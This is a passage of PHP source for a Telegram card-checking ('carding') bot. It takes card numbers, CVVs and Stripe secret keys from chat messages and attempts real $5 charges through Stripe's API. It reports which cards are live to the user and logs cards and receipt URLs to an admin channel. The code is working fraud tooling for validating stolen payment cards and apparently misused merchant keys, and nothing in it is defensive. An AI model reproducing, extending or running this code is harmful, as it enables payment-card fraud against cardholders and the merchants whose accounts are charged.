                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe auth v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if (strpos($result2, "rate_limit")){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN LATER ⚠️</b>\n<b>Response -» SK is rate limit </b>\n<b>Gateway -» Stripe auth v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        sendLog($chatId, "<b>SK LOGGED</b>\n\n<b>card:</b><code>$lista</code>\n<b> RECEPIT URL -» $rcp</b>", $message_id);
                        return;
                      }
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                    curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=500&currency=usd&customer='.$tok2.'');
                    $result3 = curl_exec($ch);
                    $msg3 = Getstr($result3,'"message": "','"');
                    $rcp = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
                    $rsk = trim(strip_tags(getStr($result3,'"risk_score": "','"')));
                    $rsklv = trim(strip_tags(getStr($result3,'"risk_level": "','"')));
                    if(strpos($result3, '"status": "succeeded"' )) {
                    sendMessage($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED 5$ ✅</b>\n<b>Response -» CHARGED 5$ SUCCESSFULLY ✅</b>\n<b>Gateway -» Stripe Custom SK charge v2.1 </b>\n<b>Risk score -» $rsk</b>\n<b> Risk Level -» $rsklv</b>\n<b> RECEPIT URL -» $rcp</b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    sendLog($chatId, "<b>SK LOGGED</b>\n\n<b>card:</b><code>$lista</code>\n<b> RECEPIT URL -» $rcp</b>", $message_id);
                    return;
                    }
                    if(strpos($result3, "insufficient_funds" )) {
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ✅</b>\n<b>Response -» Insufficient Funds </b>\n<b>Gateway -» Stripe Custom SK charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      sendLog($chatId, "<b>SK LOGGED</b>\n\n<b>card:</b><code>$lista</code>\n<b> RECEPIT URL -» $rcp</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» APROVED ⚠️</b>\n<b>Response -» 3D Card </b>\n<b>Gateway -» Stripe Custom SK charge v2.1 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                    }
                    if(strpos($result3,'"code": "incorrect_cvc"')){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ⚠️</b>\n<b>Response -» CCN Matched </b>\n<b>Gateway -» Stripe auth v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                      }
                      if(strpos($result3,'"code": "incorrect_cvc"')){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ⚠️</b>\n<b>Response -» CCN Matched </b>\n<b>Gateway -» Stripe auth v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                      }
                      if ((strpos($result3, "transaction_not_allowed")) || (strpos($result3, "transaction_not_allowed"))){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» HOLDERLOCKED ⚠️</b>\n<b>Response -» Transaction Not Allowed </b>\n<b>Gateway -» Stripe auth v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                      }
                      if ((strpos($result3, "fraudulent"))){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» REJECTED ⛔</b>\n<b>Response -» Fraudulent </b>\n<b>Gateway -» Stripe auth v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                      }
                      if ((strpos($result3, "expired_card"))){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» expired_card </b>\n<b>Gateway -» Stripe auth v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                      }
                      if ((strpos($result3, "generic_declined"))){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Generic Declined </b>\n<b>Gateway -» Stripe auth v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                        }
                      if ((strpos($result3, "do_not_honor"))){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Do Not Honor </b>\n<b>Gateway -» Stripe auth v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                      }
                      if ((strpos($result3, 'rate_limit'))){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN LATER ⚠️</b>\n<b>Response -» SK is rate limit </b>\n<b>Gateway -» Stripe auth v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        sendLog($chatId, "<b>SK LOGGED</b>\n\n<b>card:</b><code>$lista</code>\n<b> RECEPIT URL -» $rcp</b>", $message_id);
                        return;
                      }
                        
                      if ((strpos($result3, "Your card was declined."))){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Do Not Honor </b>\n<b>Gateway -» Stripe auth v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                      }
                      if ((strpos($result3, ' "message": "Your card number is incorrect."')) || (strpos($result3, ' "message": "Your card number is incorrect."'))){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» No Account </b>\n<b>Gateway -» Stripe auth v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                      }
                      if ((strpos($result3, ' "message": "testmode_charges_only"'))){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» SERVER REJECTED ❌</b>\n<b>Response -» Gate is Dead </b>\n<b>Gateway -» Stripe auth v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                      }
    
                    else {
                      sendMessage($chatId, "<b>SERVER ERROR</b>\n<b>card:</b><code>$lista</code>\n<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> \n\n<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>\n\n<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
                      sendMessage($chatId, "<b>This bug was captured and sent to admin</b>", $message_id);
                      sendLog($chatId, "<b>BUG REPORTED /CK</b>\n<b>card:</b><code>$lista</code>\n<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> \n\n<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>\n\n<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
                      }
                    }
  //==================[Custom SK CCN Command]==================//
  elseif (strpos($message, "/nk") === 0){
    
    $message = substr($message, 4);
    $cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
    $mm = multiexplode(array(":", "/", " ", "|"), $message)[1];
    $yy = multiexplode(array(":", "/", " ", "|"), $message)[2];
    $cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
    $sk = multiexplode(array(":", "/", " ", "|"), $message)[4];
                    $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'|'.$sk.'';
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
                    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                    'Host: lookup.binlist.net',
                    'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, '');
                    $fim = curl_exec($ch);
                    $bank = GetStr($fim, '"bank":{"name":"', '"');
                    $name = GetStr($fim, '"name":"', '"');
                    $brand = GetStr($fim, '"brand":"', '"');
                    $country = GetStr($fim, '"country":{"name":"', '"');
                    $emoji = GetStr($fim, '"emoji":"', '"');
                    $scheme = GetStr($fim, '"scheme":"', '"');
                    $type = GetStr($fim, '"type":"', '"');
                    if(strpos($fim, '"type":"credit"') !== false){
                    $bin = 'Credit';
                    }else{
                    $bin = 'Debit';
                    };
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                    curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.' '.$last.'&owner[email]='.$email.'&owner[address][line1]='.$street.'&owner[address][city]='.$city.'&owner[address][state]='.$state.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
                    $result1 = curl_exec($ch);
                    $tok1 = Getstr($result1,'"id": "','"');
                    $msg1 = Getstr($result1,'"message": "','"');
                    if(strpos($result1, "card_error")){
                      sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Gateway -»  Stripe Custom SK CCN charge </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
    
                      return;
                    }
                    if (strpos($result1, "card_declined")){
                      sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Gateway -»  Stripe Custom SK CCN charge </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if (strpos($result1, "rate_limit")){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN LATER ⚠️</b>\n<b>Response -» SK is rate limit </b>\n<b>Gateway -»  Stripe Custom SK CCN charge </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        sendLog($chatId, "<b>SK LOGGED</b>\n\n<b>card:</b><code>$lista</code>\n<b> RECEPIT URL -» $rcp</b>", $message_id);
                        return;
                    }
                    if (strpos($result1, "invalid_cvc")){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -»  Stripe Custom SK CCN charge </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if (strpos($result1, "sources_required_type_param")){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -»  Stripe Custom SK CCN charge </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if (strpos($msg1, "invalid_request_error")){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» SERVER REJECTED ❌</b>\n<b>Response -» Please input SK </b>\n<b>Gateway -» Stripe Custom sk charge v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
    
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                    curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$last.'&source='.$tok1.'&address[line1]='.$street.'&address[city]='.$city.'&address[state]='.$state.'&address[postal_code]='.$postcode.'&address[country]=US');
                    $result2 = curl_exec($ch);
                    $tok2 = Getstr($result2,'"id": "','"');
                    $msg2 = Getstr($result2,'"message": "','"');
                    if(strpos($result2, "card_error")){
                      sendMessage($chatId, " \n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg2 </b>\n<b>Gateway -»  Stripe Custom SK CCN charge </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if (strpos($result2, "invalid_cvc")){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -»  Stripe Custom SK CCN charge </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if (strpos($result2, "sources_required_type_param")){
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -»  Stripe Custom SK CCN charge </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      return;
                    }
                    if (strpos($result2, "rate_limit")){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN LATER ⚠️</b>\n<b>Response -» SK is rate limit </b>\n<b>Gateway -»  Stripe Custom SK CCN charge </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        sendLog($chatId, "<b>SK LOGGED</b>\n\n<b>card:</b><code>$lista</code>\n<b> RECEPIT URL -» $rcp</b>", $message_id);
                        return;
                      }
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                    curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=500&currency=usd&customer='.$tok2.'');
                    $result3 = curl_exec($ch);
                    $msg3 = Getstr($result3,'"message": "','"');
                    $rcp = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
                    $rsk = trim(strip_tags(getStr($result3,'"risk_score": "','"')));
                    $rsklv = trim(strip_tags(getStr($result3,'"risk_level": "','"')));
                    if(strpos($result3, '"status": "succeeded"' )) {
                    sendMessage($chatId, "<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED 5$ ✅</b>\n<b>Response -» CHARGED 5$ SUCCESSFULLY ✅</b>\n<b>Gateway -» Stripe Custom sk charge v2 </b>\n<b>Risk score -» $rsk</b>\n<b> Risk Level -» $rsklv</b>\n<b> RECEPIT URL -» $rcp</b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                    sendLog($chatId, "<b>SK LOGGED</b>\n\n<b>card:</b><code>$lista</code>\n<b> RECEPIT URL -» $rcp</b>", $message_id);
                    return;
                    }
                    if(strpos($result3, "insufficient_funds" )) {
                      sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ✅</b>\n<b>Response -» Insufficient Funds </b>\n<b>Gateway -» Stripe Custom sk charge v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                      sendLog($chatId, "<b>SK LOGGED</b>\n\n<b>card:</b><code>$lista</code>\n<b> RECEPIT URL -» $rcp</b>", $message_id);
                      return;
                    }
                    if ((strpos($result3, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» APROVED ⚠️</b>\n<b>Response -» 3D Card </b>\n<b>Gateway -» Stripe Custom sk charge v2 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                    }
                    if(strpos($result3,'"code": "incorrect_cvc"')){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ⚠️</b>\n<b>Response -» CCN Matched </b>\n<b>Gateway -»  Stripe Custom SK CCN charge </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                      }
                      if(strpos($result3,'"code": "incorrect_cvc"')){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» APPROVED ⚠️</b>\n<b>Response -» CCN Matched </b>\n<b>Gateway -»  Stripe Custom SK CCN charge </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                      }
                      if ((strpos($result3, "transaction_not_allowed")) || (strpos($result3, "transaction_not_allowed"))){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» HOLDERLOCKED ⚠️</b>\n<b>Response -» Transaction Not Allowed </b>\n<b>Gateway -»  Stripe Custom SK CCN charge </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                      }
                      if ((strpos($result3, "fraudulent"))){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» REJECTED ⛔</b>\n<b>Response -» Fraudulent </b>\n<b>Gateway -»  Stripe Custom SK CCN charge </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                      }
                      if ((strpos($result3, "expired_card"))){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» expired_card </b>\n<b>Gateway -»  Stripe Custom SK CCN charge </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                      }
                      if ((strpos($result3, "generic_declined"))){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Generic Declined </b>\n<b>Gateway -»  Stripe Custom SK CCN charge </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                        }
                      if ((strpos($result3, "do_not_honor"))){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Do Not Honor </b>\n<b>Gateway -»  Stripe Custom SK CCN charge </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                      }
                      if ((strpos($result3, 'rate_limit'))){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» TRY AGAIN LATER ⚠️</b>\n<b>Response -» SK is rate limit </b>\n<b>Gateway -»  Stripe Custom SK CCN charge </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        sendLog($chatId, "<b>SK LOGGED</b>\n\n<b>card:</b><code>$lista</code>\n<b> RECEPIT URL -» $rcp</b>", $message_id);
                        return;
                      }
                        
                      if ((strpos($result3, "Your card was declined."))){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Do Not Honor </b>\n<b>Gateway -»  Stripe Custom SK CCN charge </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                      }
                      if ((strpos($result3, ' "message": "Your card number is incorrect."')) || (strpos($result3, ' "message": "Your card number is incorrect."'))){
                        sendMessage($chatId, "\n<b>Card: <code>$lista</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» No Account </b>\n<b>Gateway -»  Stripe Custom SK CCN charge </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
                        return;
                      }
                      if ((strpos($result3, ' "message": "testmode_charges_only"'))){
